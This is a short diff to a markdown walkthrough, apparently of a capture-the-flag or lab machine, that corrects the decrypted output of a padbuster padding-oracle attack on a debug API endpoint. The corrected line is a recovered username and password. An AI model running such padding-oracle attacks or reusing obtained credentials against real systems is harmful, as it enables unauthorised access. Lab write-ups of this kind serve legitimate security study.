@@ -83,12 +83,12 @@ padbuster "http://$TARGET:8080/api/debug/39353661353931393932373334633638EA0DCC6
 
 **Output**
 ```
-[+] Decrypted value (ASCII): stefan1197:ebb2B76@62#f??7cA6B76@6!@62#f6dacd2599
+[+] Decrypted value (ASCII): stefan1197:ebb2B76@62#f7cA6B76@6!@62#f6dacd2599
 ```
 
 **Credentials obtained:**
 ```
-stefan1197 : ebb2B76@62#f??7cA6B76@6!@62#f6dacd2599
+stefan1197 : ebb2B76@62#f7cA6B76@6!@62#f6dacd2599
 ```
 
 ---
